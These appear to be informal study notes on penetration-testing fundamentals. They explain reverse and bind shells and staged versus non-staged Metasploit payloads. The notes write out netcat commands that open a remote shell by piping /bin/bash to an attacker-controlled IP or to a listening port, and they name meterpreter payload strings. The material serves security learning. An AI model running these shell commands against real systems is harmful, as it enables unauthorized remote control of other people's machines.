reverse shell
	victim machine connects to us 
	(Netcat)
		nc -nlvp 4444 (listener)
		nc (IP) 4444 -e /bin/bash (connecting)
Bind shell
	connecting to the victim machine opening up a port to access connect to 
	us (Connecting) nc (IP) (Port)
	victim (Listenting) nc -lvp (port) -e /bin/bash
	These are most useful when we have to connect our private IP to an public (External Assessment) we would have to Nat the reverse traffic through our firewall/public IP
	easier to open a port on an victim and go that way

Staged vs non Staged payloads
	Payloads
		what we are sending the machine (the exploit) (or to get a shell)
	non -staged
		sends exploit shellcode all at once
		(larger in size and wont always work)
		ex windows/meterpreter_reverse_tcp (difference is a / )
	staged 
		Sends Payload in stages
		less stable
		ex  - windows/meterpreter/reverse_tcp (difference is /)
